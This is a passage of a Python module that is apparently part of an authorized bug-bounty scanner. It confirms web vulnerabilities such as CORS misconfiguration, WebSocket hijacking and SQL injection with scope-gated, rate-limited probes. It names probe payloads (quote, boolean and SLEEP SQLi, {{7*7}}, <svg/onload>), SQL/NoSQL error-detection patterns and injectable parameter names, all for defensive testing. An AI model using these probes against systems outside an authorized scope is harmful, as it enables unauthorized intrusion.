"""GreyIQ BugHunter — opt-in ACTIVE proof-capture verification.

The static/passive scanners produce *leads* that cap at proof status "candidate"
(a static tool can't exploit). This layer closes the loop for the subset of
classes that are provable with a single benign request: it fires at most one
crafted, **non-destructive** GET/HEAD/OPTIONS per check, captures the exact proof
artifact the impact model's ``proof_obligation`` names, validates it against a
same-run **negative control**, and returns a ``status:'confirmed'`` proof dict
(with the captured request/response) for the orchestrator to merge — so the
report renders "Confirmed" with no report.py change.

SAFETY (this is the one place a bounty tool could become a weapon):
  - Double-gated: only runs when the caller passes ``active=True`` AND the hunt is
    ``authorized=True`` AND the target is a URL. A default hunt sends ZERO crafted
    requests.
  - Scope-bound, fail-closed: only probes a host the operator NAMED in the hunt
    scope (or an env allowlist, or — for your own infra — a private host with
    GREYIQ_SCAN_ALLOW_PRIVATE_URLS=1). Any other host is downgraded to passive-only.
  - No new egress path: every request reuses web_scan_service._guard_url + the same
    settings, so SSRF/private-host/metadata/port/IDN guards apply identically.
    Redirects are NEVER followed off-host — the first 30x Location is *captured*.
  - Methods are GET/HEAD/OPTIONS only with benign idempotent markers (a single
    quote to elicit a SQL error, an `AND '1'='1` vs `AND '1'='2` boolean differential
    that reads ONE bit and extracts no data, a `{{7*7}}` arithmetic expression to
    detect a template engine, a `<svg/onload>` reflection probe, an encoded-CRLF +
    custom-header marker to detect header injection — all inspected, never executed by
    us); never a state-changing verb/parameter, never a file-read/RCE payload, never
    fuzzing/wordlists.
  - OPT-IN time-based blind SQLi (``time_based=True``) is the one exception to the
    "never executed" rule: it injects a single FIXED, bounded ``SLEEP(4)`` (well under
    the fetch timeout, no amplification), reads ZERO data (one timing bit), excludes the
    governor throttle from its measurement, and confirms only on a stable multi-trial
    differential against a fast ``SLEEP(0)`` negative control. Off by default.
  - Open-bucket exposure only GET-probes a cloud bucket whose HOST is itself in the
    hunt scope; a referenced third-party bucket is reported as a candidate, never probed.
  - A per-host token-bucket governor + a per-hunt request budget bound the load.
  - Every captured string is redacted before it lands in a proof artifact.
  - Fail-closed proof: 'confirmed' needs a positive observation AND a control
    differential; otherwise it degrades to 'candidate'.
"""

from __future__ import annotations

import base64
import binascii
import difflib
import hashlib
import hmac
import json
import re
import time
from typing import Any, Callable
from urllib.error import HTTPError, URLError
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse
from urllib.request import HTTPRedirectHandler, Request, build_opener

from bughunter import digest_builder, impact_model, sensitive_data
from bughunter.code_scanner.redaction import redact_text
from bughunter.prover_classes import PROVER_CLASSES
from bughunter.rate_limit import HostRateGovernor
from bughunter.registrable_domain import is_bare_public_suffix, registrable_domain
from bughunter.scan_auth import AuthContext, auth_headers_for
from bughunter.settings import get_settings
from bughunter.web_ingest import (
    WebsiteFetchError,
    _ascii_hostname,
    _host_is_private,
    guarded_dns_scope,
    normalize_website_url,
)
from bughunter.web_scan_service import (
    _ERROR_PATTERNS,
    _USER_AGENT,
    _consume,
    _guard_url,
    current_user_agent,
)

# A reserved, non-resolving marker host (RFC 2606 example.* is reserved and will
# never point at a victim). Used as the off-origin target for redirect / CORS /
# host-header proofs so nothing is ever actually sent to it.
_MARKER_HOST = "greyiq-marker.example"
_MARKER_ORIGIN = f"https://{_MARKER_HOST}"
# RFC-6455 handshake magic GUID: the server appends it to our Sec-WebSocket-Key and SHA1s the result
# into Sec-WebSocket-Accept — an offline-computable cryptographic negative control for the CSWSH check.
_WS_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
# Path segments that conventionally host a WebSocket endpoint. The CSWSH check ONLY spends a request on a
# path whose segment matches one of these (or a landing response that announced an upgrade) — so it costs
# nothing against ordinary pages and never preempts the high-value confirmable checks' request budget.
_WS_PATH_HINTS = frozenset({"ws", "wss", "websocket", "websockets", "socket", "sockjs", "socket.io",
                            "cable", "hub", "hubs", "signalr", "subscriptions", "graphql-ws", "mqtt",
                            "stomp", "rtm"})
_REDIRECT_PARAMS = ("next", "redirect", "url", "returnurl", "return_url", "redirect_uri", "redirecturl", "continue", "callback", "dest", "destination", "returnto", "return_to")
_XSS_PARAMS = ("q", "query", "search", "s", "keyword", "message", "name", "comment")
_SSTI_PARAMS = ("q", "template", "tpl", "view", "theme", "preview", "name")
_RCE_PARAMS = ("cmd", "command", "exec", "ping", "host", "ip", "domain", "query", "q")
# Default per-pass request ceiling. Twelve could not seat the suite, and no ordering could fix that:
# against a one-parameter URL the landing fetch, CORS, the three redirect probes and the three
# host-header probes spend ten between them, so whichever injection check was ordered last got
# nothing. Ordering could only ever choose WHICH class starved.
#
# MEASURED, not estimated. Driven against the E2E fixture with an unbounded budget so nothing
# truncates: 62 requests for a one-parameter URL, 90 for three parameters (with or without six
# recon-discovered names -- the per-check caps bind first), and 99 with the opt-in timing probes on.
# A JWT-bearing target adds roughly fifteen more (four JWT checks, each taking its own baseline and
# negative control) and a GraphQL path a couple. 160 seats that worst case with headroom. An earlier
# draft guessed "80-90" from a partial reading and set 100, which truncated a timing hunt at exactly
# the heaviest check -- reintroducing, one check further down, the starvation it existed to cure.
#
# This is a ceiling, not a target: every check is self-gating (path-gated, signature-gated, or exits
# on the first parameter that answers), so an ordinary target costs far less. Politeness is still
# ENFORCED rather than promised, by two things this does not relax: the inter-request floor
# (GREYIQ_ACTIVE_MIN_INTERVAL_MS, 500 ms) and the process-wide per-host token bucket
# (GREYIQ_ACTIVE_MAX_REQUESTS_PER_HOST). That bucket must stay above this value TIMES the fan-out --
# one hunt runs up to four ranked endpoints on one host through the SAME bucket -- or the bucket,
# not the budget, silently becomes the real limit and the later siblings get nothing. Callers that
# size their own budget (the hunt loop, the re-plan wave, the API re-verify paths) pass it
# explicitly and are unaffected.
_DEFAULT_REQUESTS_BUDGET = 160
_PATH_PARAMS = ("file", "filename", "path", "page", "template", "doc", "download", "attachment")
_SAFE_METHODS = {"GET", "HEAD", "OPTIONS"}
# SQL-specific error signatures only — a generic stack trace is not SQL injection.
_SQL_ERROR_RE = re.compile(
    r"SQLSTATE\[|\bORA-\d{5}\b|SQL syntax.{0,40}near|\bpsql:|PostgreSQL.{0,30}ERROR|"
    r"Microsoft OLE DB Provider for SQL Server|Unclosed quotation mark|Incorrect syntax near|"
    r"You have an error in your SQL syntax|SQLite3?::|sqlite3.OperationalError|"
    r"quoted string not properly terminated|\bDB2 SQL error\b|\bSQL\d{4}N\b|"
    r"Npgsql\.|System\.Data\.SqlClient\.SqlException|valid MySQL result",
    re.IGNORECASE,
)
# High-signal NoSQL backend error banners ONLY — unambiguous Mongo/Mongoose/BSON/PyMongo/
# Couchbase errors. Generic JS/stack traces are deliberately excluded (they'd false-positive
# against the engine's confirm-grade promise). Matched only with a negative control.
_NOSQL_ERROR_RE = re.compile(
    r"Mongo(?:Server|Network|Parse)?Error"
    r"|MongooseError"
    r"|BSON(?:Type)?Error"
    r"|Cast(?:Error)?\s+to\s+(?:ObjectId|Number|Boolean|Date|Buffer|String)\s+failed"
    r"|E11000\s+duplicate\s+key"
    r"|pymongo(?:\.errors)?\b"
    r"|OperationFailure"
    r"|N1QL(?:Error)?|CouchbaseError",
    re.IGNORECASE,
)
# A stable marker token (no Math.random needed): unique enough across one host's
# response surface, deterministic for tests.
_MARK = "gq7x4q2v"
# A JWT-shaped value: three base64url segments (the third may be empty for an
# already-unsigned token).
_JWT_RE = re.compile(r"^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$")
# A JWT EMBEDDED in free text (body/header) — anchored to the `eyJ` prefix (the base64url of a JSON
# object opening `{"`), so it locates a real token, not any dotted string. Bounded quantifiers (no
# nested repetition) keep it linear-time on hostile input.
_EMBEDDED_JWT_RE = re.compile(r"\beyJ[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{4,}\.[A-Za-z0-9_-]*")


class _ActiveError(Exception):
    """Internal: a single active request failed (network/guard) — skip that check."""


class _RateLimited(Exception):
    """The per-host request budget is exhausted. Deliberately NOT an _ActiveError so
    the per-check ``except _ActiveError`` doesn't swallow it — it must propagate up to
    verify_active and stop the whole active pass (fail closed, no bursting)."""


class _NoRedirect(HTTPRedirectHandler):
    """Capture, never follow: returning None makes urllib raise HTTPError for a
    3xx so we can read the Location without an off-host hop."""

    def redirect_request(self, req, fp, code, msg, headers, newurl):  # noqa: ANN001, N802
        return None


def _registrable(host: str) -> str:
    """Best-effort, public-suffix-AWARE eTLD+1. Good enough for a scope-naming check;
    the operator names example.com or the full host. See registrable_domain.py: this is
    NOT last-two-labels for known multi-label suffixes (foo.co.uk, myapp.herokuapp.com)."""
    return registrable_domain(host)


def _scope_hosts(scope: str) -> set[str]:
    """Extract dotted host tokens from free-text scope, normalizing pasted URLs and
    `*.`-wildcards to bare hosts. Used for EXACT / proper-suffix matching — never a
    substring test (so 'example.com' can't match scope text 'notexample.com')."""
    hosts: set[str] = set()
    for raw in re.split(r"[\s,;]+", (scope or "").lower()):
        token = raw.strip().strip("()<>[]\"'")
        if not token:
            continue
        token = (urlparse(token).hostname or "") if "://" in token else token.split("/", 1)[0]
        token = token.lstrip("*").lstrip(".")
        if token and "." in token:  # require a dotted host, not a bare word
            hosts.add(token)
    return hosts


def host_in_active_scope(host: str, scope: str, settings: Any) -> bool:
    """Fail-closed scope binding: a host is eligible for ACTIVE probing only if the
    operator named it (its registrable domain or full host appears in the scope
    text), or it matches the env allowlist, or it's your own private/loopback infra
    with private URLs explicitly allowed. settings.excluded_hosts (a saved program's
    out_of_scope_hosts, when the caller resolved one) is checked FIRST and always wins
    over every positive match below — an exclusion the operator set can never be
    silently overridden by a broader scope_text wildcard."""
    cleaned = (host or "").strip().lower().strip("[]")
    if not cleaned:
        return False
    reg = _registrable(cleaned)
    for excluded in getattr(settings, "excluded_hosts", ()) or ():
        token = str(excluded or "").strip().lower().strip("[]").lstrip("*").lstrip(".")
        if not token:
            continue
        if cleaned == token or cleaned.endswith("." + token) or reg == token:
            return False
    # No-DNS checks first: the operator named the host. Match host TOKENS exactly or
    # by proper dotted suffix — not a substring of the free text (which would let
    # 'example.com' match scope 'notexample.com' and probe an out-of-scope host).
    for token in _scope_hosts(scope):
        if is_bare_public_suffix(token):
            # The token IS itself a known multi-label public suffix (e.g.
            # 'herokuapp.com', 'co.uk') -- never someone's own apex, so naming it bare
            # in free-text scope can NEVER legitimately authorize the whole shared
            # platform (every unrelated tenant's subdomain would otherwise match the
            # dotted-suffix wildcard below). Skip it entirely for this token.
            continue
        if cleaned == token or cleaned.endswith("." + token) or reg == token:
            return True
    for suffix in getattr(settings, "active_scan_allowlist", ()):  # host-suffix allowlist
        if cleaned == suffix or cleaned.endswith("." + suffix):
            return True
    # Own infra: a private/loopback host is in scope only when private URLs are
    # explicitly allowed. This resolves DNS, so do it last and tolerate failure.
    if getattr(settings, "allow_private_urls", False):
        try:
            if _host_is_private(_ascii_hostname(cleaned)):
                return True
        except WebsiteFetchError:
            return False
    return False


def _with_query(url: str, params: dict[str, str]) -> str:
    parsed = urlparse(url)
    existing = dict(parse_qsl(parsed.query, keep_blank_values=True))
    existing.update(params)
    return urlunparse(parsed._replace(query=urlencode(existing)))


# A valid query-parameter token (incl. PHP/Rails-style `user[id]` / `filter.name`).
# Operator- and recon-supplied param names are validated against this before they ever
# become a probe key — a malformed token is dropped rather than injected.
_PARAM_NAME_RE = re.compile(r"^[A-Za-z_][A-Za-z0-9_\-\[\]\.]{0,39}$")
_MAX_DISCOVERED_PARAMS = 40
# Param NAMES that signal a redirect/forward target (used to pick which discovered
# params the redirect/CRLF checks bite on, without fuzzing every unrelated param).
_REDIRECT_HINTS = ("redirect", "return", "next", "dest", "continue", "callback", "forward", "goto", "url")


def _clean_param_names(names: Any) -> list[str]:
    """Sanitize + bound caller-supplied (recon/operator) param names before they become
    probe keys: keep only well-formed tokens, dedupe case-insensitively, cap the count.
    These are names DISCOVERED from the target's own JS/HTML (evidence the param exists),
    not a blind wordlist."""
    out: list[str] = []
    seen: set[str] = set()
    for raw in names or []:
        name = str(raw or "").strip()
        if not _PARAM_NAME_RE.match(name):
            continue
        key = name.lower()
        if key in seen:
            continue
        seen.add(key)
        out.append(name)
        if len(out) >= _MAX_DISCOVERED_PARAMS:
            break
    return out


def _candidate_params(url: str, extra: list[str] | None, default: tuple[str, ...], limit: int,
                      priority: list[str] | None = None) -> list[str]:
    """Ordered, deduped parameter names a param-keyed check should probe: ``priority`` names FIRST
    (the reasoning layer's class-specific picks — e.g. the params it judges take a URL for SSRF, or
    reflect input for XSS — the highest-signal targets, so within the small per-check cap they get
    tried), then params already present in the URL, then recon-discovered names, then a small built-in
    default — capped at ``limit`` (the SAME small per-check cap as before, so an already-parametered
    URL costs the same number of requests). Pass ``default=()`` for the SQLi checks so a param-less
    endpoint with no discovered name still bails — they never invent an injection point.

    ``priority`` is NAMES ONLY (a name can never carry a payload); the check still supplies the payload
    and independently confirms, so a brain-suggested name can raise recall but never precision."""
    out: list[str] = []
    seen: set[str] = set()

    def _add(name: str) -> None:
        clean = (name or "").strip()
        key = clean.lower()
        if clean and key not in seen:
            seen.add(key)
            out.append(clean)

    for name in priority or []:  # the brain's class-specific picks, tried first within the cap
        _add(name)
    for key, _ in parse_qsl(urlparse(url).query, keep_blank_values=True):
        _add(key)
    for name in extra or []:
        _add(name)
    if not out:
        for name in default:
            _add(name)
    return out[:limit]


def _redirect_candidates(url: str, extra: list[str] | None, default: tuple[str, ...], limit: int) -> list[str]:
    """Redirect/CRLF candidates: redirect-NAMED params already in the URL first, then
    recon-discovered params whose NAME looks like a redirect/forward target, then the
    built-in defaults — so a custom-named redirect param the app actually uses gets tested
    without firing at every unrelated param."""
    existing = {k.lower() for k, _ in parse_qsl(urlparse(url).query, keep_blank_values=True)}
    out: list[str] = []
    seen: set[str] = set()

    def _add(name: str) -> None:
        clean = (name or "").strip()
        key = clean.lower()
        if clean and key not in seen:
            seen.add(key)
            out.append(clean)

    for param in _REDIRECT_PARAMS:
        if param in existing:
            _add(param)
    for name in extra or []:
        if any(hint in (name or "").lower() for hint in _REDIRECT_HINTS):
            _add(name)
    if not out:
        for name in default:
            _add(name)
    return out[:limit]


# A bounded retry for CONNECTION-LEVEL transient failures only (reset TCP, a DNS
# hiccup, a timeout) -- never for an HTTPError (any status code, including 502/503),
# which is a real answer from the server that the differential checks (bool-SQLi,
# error-SQLi, CORS reflection) need to see as-is. One retry, short fixed backoff --
# a bug-bounty target shouldn't get hammered even by a benign probe.
_MAX_FETCH_ATTEMPTS = 2
_FETCH_RETRY_BACKOFF_S = 0.4


class _Http:
    """Bounded, SSRF-guarded, non-redirect-following HTTP for active checks. Two
    independent ceilings: a per-hunt request budget (``max_requests``, counted here)
    and a process-wide per-host token bucket (the governor)."""

    def __init__(self, settings: Any, governor: HostRateGovernor, max_requests: int = 12,
                 auth: AuthContext | None = None) -> None:
        self.settings = settings
        self.governor = governor
        self.max_requests = max(1, int(max_requests))
        self.auth = auth  # operator session, attached SAME-SITE only (never to a foreign bucket)
        self.sent = 0
        self.opener = build_opener(_NoRedirect())

    def fetch(self, url: str, *, method: str = "GET", extra_headers: dict[str, str] | None = None,
              read_body: bool = True) -> dict[str, Any]:
        method = method.upper()
        if method not in _SAFE_METHODS:  # belt-and-suspenders; callers never pass others
            raise _ActiveError(f"refused non-idempotent method {method}")
        if self.sent >= self.max_requests:  # per-hunt budget, independent of the host bucket
            raise _RateLimited()
        # guarded_dns_scope() covers guard-check through the real connect so the DNS
        # pin _guard_url() installs is still in effect when the actual HTTP connect
        # (a few lines down) independently re-resolves the same hostname — closing the
        # DNS-rebinding check-then-connect gap. Every active check funnels through
        # this ONE fetch(), so fixing it here covers the whole active-verify engine.
        with guarded_dns_scope():
            sanitized = _guard_url(normalize_website_url(url), self.settings.allow_private_urls, self.settings.web_allowed_ports)
            host = urlparse(sanitized).hostname or ""
            if not self.governor.throttle(host):
                raise _RateLimited()
            self.sent += 1
            headers = {"User-Agent": current_user_agent(_USER_AGENT), "Accept": "*/*", "Accept-Encoding": "identity"}
            # Operator auth is attached ONLY when this request's host is same-site as the
            # bound host — so the open-bucket check's foreign-host fetch (and any other
            # off-target host) never receives the session.
            headers.update(auth_headers_for(host, self.auth))
            if extra_headers:
                headers.update(extra_headers)
            request = Request(sanitized, headers=headers, method=method)
            # This retry loop is still ONE logical probe -- self.sent and the governor
            # token were already spent once above, and are never spent again here, no
            # matter how many attempts a single fetch() call takes.
            for attempt in range(1, _MAX_FETCH_ATTEMPTS + 1):
                # Time ONLY the request (not the governor throttle, and not a prior
                # attempt's backoff sleep), so a time-based check measures the server,
                # not our own rate-limit/retry delay.
                started = time.monotonic()
                try:
                    with self.opener.open(request, timeout=self.settings.web_fetch_timeout_seconds) as resp:
                        consumed = _consume(resp, self.settings, read_body=read_body)
                        consumed["final_url"] = resp.geturl()
                        consumed["location"] = resp.headers.get("Location") if resp.headers else None
                        consumed["elapsed"] = time.monotonic() - started
                        return consumed
                except HTTPError as exc:
                    # A 3xx (captured, not followed) or 4xx/5xx is a valid observation
                    # from the server -- never retried. HTTPError is itself a response object
                    # holding a socket; several checks deliberately elicit 4xx/5xx (sensitive-
                    # path/debug probes, error-SQLi, alg:none control), so close it or every
                    # errored probe leaks an FD until GC.
                    try:
                        consumed = _consume(exc, self.settings, read_body=read_body)
                        consumed["final_url"] = sanitized
                        consumed["location"] = exc.headers.get("Location") if exc.headers else None
                        consumed["elapsed"] = time.monotonic() - started
                        return consumed
                    finally:
                        exc.close()
                except (URLError, TimeoutError, OSError) as exc:
                    if attempt >= _MAX_FETCH_ATTEMPTS:
                        raise _ActiveError(str(exc)) from exc
                    time.sleep(_FETCH_RETRY_BACKOFF_S * attempt)


def _redact(value: str) -> str:
    return redact_text(str(value or ""))[0]


def _proof(status: str, **fields: Any) -> dict[str, Any]:
    base = {
        "status": status, "method": "", "actor": "unauthenticated", "affected_asset": "",
        "observed_result": "", "control_result": "", "evidence": "", "limitations": "",
    }
    base.update({k: _redact(v) if isinstance(v, str) else v for k, v in fields.items()})
    return base


# The vocabulary a caller's ``class_priority`` ranking may name, re-exported so a caller holding only
# this module can validate its tags without also importing the planner. It is NOT consulted at
# runtime: the ``checks`` list inside verify_active IS the definition, unknown ranks are simply
# ignored by _apply_class_priority below, and test_active_verify_service asserts the two agree.
ACTIVE_PROVER_CLASSES: frozenset[str] = PROVER_CLASSES


def _restrict_to_classes(checks: list[tuple[str, Any]], only_classes: list[str] | None) -> list[tuple[str, Any]]:
    """Keep only the checks whose class the caller asked for. Pure: never adds or mutates a check.

    ``_apply_class_priority`` REORDERS; this RESTRICTS, and the difference is the whole point of a
    steered turn. Reordering alone still re-pays for every other check in the suite, so an iterative
    loop that only reorders spends most of each extra turn recomputing the previous one — a turn that
    wants "sqli on one new parameter" was also re-running clickjacking, csrf, three JWT probes, two
    GraphQL probes, CORS, redirect, host-header, two XSS probes and the rest. Restricting lets the
    reclaimed budget go to the hypothesis the caller actually wants tested.

    FAIL-OPEN, twice over: an empty/None restriction leaves the list untouched, and a restriction that
    matches nothing falls back to the full suite rather than silently probing nothing. Restricting can
    only ever spend FEWER requests and can never mint a confirmation — the checks that do run are
    byte-identical and the confirm gate is untouched. RECALL is the caller's responsibility: the hunt
    loop restricts only on steered turns, after turn 0 has run the suite in full.
    """
    if not only_classes:
        return checks
    wanted = {str(c or "").strip().lower() for c in only_classes}
    wanted.discard("")
    if not wanted:
        return checks
    kept = [ck for ck in checks if ck[0] in wanted]
    return kept or checks


def _apply_class_priority(checks: list[tuple[str, Any]], class_priority: list[str] | None) -> list[tuple[str, Any]]:
    """Apply the caller's ordered class ranking, preserving default order within each rank.

    Pure: never adds, removes, or mutates a check — only reorders. Empty/None/unknown priority
    leaves the tuned default order unchanged.
    """
    if not class_priority:
        return checks
    rank: dict[str, int] = {}
    for raw in class_priority:
        key = str(raw or "").strip().lower()
        if key and key not in rank:
            rank[key] = len(rank)
    if not rank or not any(class_key in rank for class_key, _ in checks):
        return checks
    # The input is an ordered ranking, not a membership set. ``sorted`` is stable, so checks
    # sharing one class and the entire unranked tail retain their tuned default order.
    return sorted(checks, key=lambda ck: rank.get(ck[0], len(rank)))


def _finding(rule_id: str, title: str, severity: str, category: str, class_hint: str, url: str,
             proof: dict[str, Any], proof_evidence: dict[str, str], cvss: dict[str, Any] | None = None) -> dict[str, Any]:
    return {
        "rule_id": rule_id, "title": title, "severity": severity, "confidence": "high",
        "category": category, "file_path": url, "line_start": 1, "line_end": 1,
        "snippet": _redact(proof.get("observed_result") or "")[:240],
        "remediation": "", "redacted": True,
        "proof_evidence": {k: _redact(v) for k, v in proof_evidence.items() if str(v or "").strip()},
        "_active_proof": proof,
        "_active_cvss": cvss,
        "_active_class_hint": class_hint,
    }


# ----------------------------- individual checks -----------------------------
# Each returns a finding dict (confirmed/candidate) or None. Conservative: a
# 'confirmed' status requires a positive observation AND a control differential.


def _is_websocket_endpoint(url: str, landing: dict[str, Any] | None) -> bool:
    """A cheap, no-request gate: is this URL plausibly a WebSocket endpoint? True when a path segment is a
    conventional WS name (``/ws``, ``/socket.io``, ``/cable`` …) OR the already-fetched landing response
    announced an upgrade (``426 Upgrade Required`` or an ``Upgrade: websocket`` header). Keeps the CSWSH
    handshake off ordinary pages so it never wastes the request budget the confirmable checks depend on."""
    segments = {s for s in (urlparse(url).path or "").lower().split("/") if s}
    if segments & _WS_PATH_HINTS:
        return True
    if isinstance(landing, dict):
        if int(landing.get("status") or 0) == 426:  # Upgrade Required — the server itself asks to switch
            return True
        if "websocket" in str((landing.get("headers") or {}).get("upgrade") or "").lower():
            return True
    return False


def _check_cswsh(http: "_Http", url: str, landing: dict[str, Any] | None = None) -> dict[str, Any] | None:
    """WebSocket cross-site hijacking (CSWSH): does the endpoint complete a WebSocket handshake that
    carries an ATTACKER (cross-site) Origin? Only fires on a WebSocket-shaped endpoint (see
    ``_is_websocket_endpoint``) so it costs nothing on ordinary pages. ONE benign RFC-6455 handshake — a
    GET with the Upgrade / Sec-WebSocket-* headers and ``Origin: <reserved marker>`` — is sent; NO
    WebSocket frame is ever transmitted and NO body is read (read_body=False, so a server holding the
    socket open never blocks us). Confirmed ONLY when the server returns ``101 Switching Protocols`` AND a
    ``Sec-WebSocket-Accept`` equal to base64(SHA1(the key WE sent + the RFC-6455 GUID)). That accept token
    IS the cryptographic negative control (offline-computable, like the JWT weak-secret self-cert): it
    proves a real WebSocket server processed OUR marker-Origin handshake — not an unconditional 101, a
    proxy artifact, or a soft-404. Benign + scope/SSRF-gated by the shared http.fetch."""
    if not _is_websocket_endpoint(url, landing):
        return None
    key = base64.b64encode(hashlib.sha256(_MARKER_ORIGIN.encode()).digest()[:16]).decode()  # deterministic 16-byte key
    expected = base64.b64encode(hashlib.sha1((key + _WS_GUID).encode()).digest()).decode()
    handshake = {"Connection": "Upgrade", "Upgrade": "websocket", "Sec-WebSocket-Version": "13",
                 "Sec-WebSocket-Key": key, "Origin": _MARKER_ORIGIN}
    try:
        r = http.fetch(url, extra_headers=handshake, read_body=False)
    except (_RateLimited, _ActiveError, WebsiteFetchError):
        return None
    except Exception:  # noqa: BLE001 - an odd 101 / blocking handshake is a clean no-confirm, never a crash
        return None
    if int(r.get("status") or 0) != 101:
        return None
    accept = str((r.get("headers") or {}).get("sec-websocket-accept") or "").strip()
    if not accept or accept != expected:
        return None  # a 101 without OUR key's derived accept is a proxy/soft artifact, not a real handshake
    proof = _proof(
        "confirmed",
        method=f"RFC-6455 WebSocket handshake with Origin: {_MARKER_ORIGIN} (no frame sent, no body read)",
        affected_asset=f"the WebSocket endpoint at {url}",
        observed_result=("server returned 101 Switching Protocols with a Sec-WebSocket-Accept derived from "
                         "OUR key, while the handshake carried an attacker (cross-site) Origin"),
        control_result=("the accept token equals base64(SHA1(our_key + RFC-6455 GUID)) — a real WebSocket "
                        "server processed OUR marker-Origin handshake, not an unconditional / proxy 101 or soft-404"),
        evidence=f"Sec-WebSocket-Accept: {accept}",
        limitations=("Confirms the handshake accepts a cross-site Origin. Full impact depends on whether the "
                     "socket then serves authenticated data to that origin — verify with a browser PoC hosted "
                     "on an attacker origin against a logged-in victim session."),
    )
    return _finding(
        "active.cswsh-origin", "WebSocket handshake accepts a cross-site Origin (possible CSWSH)",
        "low", "cors", "websocket", url, proof,
        {"request_line": f"GET {url}   (Upgrade: websocket; Origin: {_MARKER_ORIGIN})",
         "response_status": "101 Switching Protocols",
         "matched_value": f"Sec-WebSocket-Accept derived from the key we sent ({accept})"},
        {"vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N", "base_score": 3.1, "base_severity": "low", "estimated": True},
    )

def _cors_cvss(tier: str) -> dict[str, Any]:
    """A per-finding, evidence-based CVSS v3.1 block for a CORS misconfiguration, sized to
    what the engine actually proved. NEVER C:H — the active layer only performs a SAME-SITE
    (curl-equivalent) read, which does not prove a browser cross-origin read, so confidentiality
    impact caps at Low. High (C:H) is reserved for a browser-hosted PoC that reads sensitive
    victim data cross-origin — evidence this engine does not, by itself, produce.

      medium — arbitrary Origin reflected + Allow-Credentials:true CONFIRMED on an
               authenticated endpoint that returned a real 2xx body (impact plausible, not
               yet browser-proven).
      low    — the misconfiguration is confirmed, but only on a non-authenticated / non-2xx
               / empty response (404, 403, redirect, health check, static/public content),
               so no sensitive cross-origin read is demonstrated."""
    vector = (
        "AV:N/AC:L/PR:N/UI:R/S:U/C:L/I:N/A:N" if tier == "medium"
        else "AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N"
    )
    scored = impact_model.cvss_base_score(vector)
    if tier == "medium":
        why = ("Arbitrary-Origin reflection with Allow-Credentials:true is confirmed on an authenticated "
               "endpoint (server-side header behaviour). Confidentiality impact is scored Low, not High, "
               "because a browser cross-origin read of sensitive victim data has not yet been demonstrated — "
               "capture a browser-hosted PoC to justify a higher score.")
    else:
        why = ("The CORS header misconfiguration is confirmed, but only on a non-sensitive response (non-2xx, "
               "empty, or unauthenticated), so no cross-origin read of sensitive authenticated data is "
               "demonstrated. Severity stays Low until impact is shown on an authenticated data endpoint.")
    return {
        "vector": vector,
        "base_score": scored["score"],
        "base_severity": scored["severity"],
        "estimated": False,
        "justification": why,
    }


def _cors_read_impact(http: _Http, probe: dict[str, Any], proof: dict[str, Any], ev: dict[str, str]) -> str:
    """Grade the demonstrated impact of a proven CORS *misconfiguration* and, when possible,
    capture the authenticated response body — WITHOUT overclaiming a browser cross-origin read.

    Returns the evidence-based severity tier ('medium' or 'low'):

      * The active layer's ``fetch`` attaches the operator's SAME-SITE session, so a 2xx body is
        what the endpoint returns *to a same-site request* (curl-equivalent). That is NOT proof a
        browser would send the victim's cookie cross-origin (SameSite) nor that an attacker page
        actually read it — so this NEVER returns 'high'. High requires a browser-hosted PoC.
      * 'medium' — authenticated scan + a real 2xx body: a live authenticated endpoint whose CORS
        headers WOULD let an attacker origin read a response like this. The body is captured as
        ``read_data`` and any sensitive data in it is NAMED (``sensitive_data_labels``), classified
        on the RAW body before redaction so JWT/token/session material is not missed.
      * 'low' — unauthenticated scan, non-2xx (404/403/redirect/health), or a trivially-empty body:
        the header misconfiguration is confirmed but no sensitive cross-origin read is demonstrated.

    The proof's observed_result / affected_asset are rewritten to say exactly this, so the report
    can never read as "sensitive data theft confirmed" off a header-only or non-sensitive result."""
    try:
        status = int(probe.get("status") or 0)
    except (TypeError, ValueError):
        status = 0
    body = str(probe.get("body") or "")
    authenticated = getattr(http, "auth", None) is not None
    has_body = 200 <= status < 300 and len(body.strip()) >= 8

    if not (authenticated and has_body):
        # Confirmed header behaviour only — no authenticated body to demonstrate a read.
        reason = (
            f"the tested endpoint returned HTTP {status or '(no body)'}"
            if not (200 <= status < 300) else
            "the scan was unauthenticated, so no victim-specific body could be captured"
            if not authenticated else
            "the response body was empty/non-sensitive"
        )
        proof["observed_result"] = (
            (proof.get("observed_result") or "").rstrip(". ")
            + f"; {reason}, so a cross-origin read of sensitive authenticated data is NOT demonstrated "
              "by this evidence — the confirmed result is the server-side CORS header behaviour only"
        )
        proof["affected_asset"] = (
            "the server's CORS response-header policy (confirmed); sensitive-data impact is unproven "
            "on this endpoint"
        )
        proof.setdefault("limitations", "")
        proof["limitations"] = (
            (proof["limitations"] + " " if proof["limitations"] else "")
            + "Server-side header behaviour is confirmed (curl-level). A browser-hosted PoC on an "
              "attacker origin that reads a sensitive authenticated response is required to prove "
              "browser exploitability and sensitive impact."
        ).strip()
        return "low"

    # Authenticated 2xx body captured: a live authenticated endpoint. Classify the RAW body
    # (before _finding() redacts) so token/JWT/session material is named, not missed.
    labels = sensitive_data.classify(body)
    named = sensitive_data.summarize(body)
    proof["actor"] = "an attacker-controlled web page loaded by a logged-in victim (browser PoC required to confirm)"
    proof["observed_result"] = (
        (proof.get("observed_result") or "").rstrip(". ")
        + f"; requested WITH the operator's session (a same-site, curl-equivalent read), the endpoint "
          f"returned a {len(body)}-byte authenticated body"
        + (f" containing {named}" if named else "")
        + ". The confirmed CORS headers WOULD let an attacker-controlled origin read a response like "
          "this; a browser cross-origin read has not yet been proven"
    )
    proof["affected_asset"] = (
        "authenticated responses from this endpoint" + (f" (observed to include {named})" if named else "")
    )
    proof.setdefault("limitations", "")
    proof["limitations"] = (
        (proof["limitations"] + " " if proof["limitations"] else "")
        + "The read shown was same-site (the tool's own session), which proves the endpoint returns this "
          "data but NOT that a browser sends the victim's cookie cross-origin. Host the PoC on an attacker "
          "origin and capture the response body it reads to confirm browser exploitability."
    ).strip()
    # Store the RAW excerpt; _finding() redacts every proof_evidence value exactly once.
    ev["read_data"] = body[:1500]
    if labels:
        # Labels are generic English (never the secret itself) so they survive redaction and let the
        # report name the sensitive data even when the redacted excerpt shows only [REDACTED_…] markers.
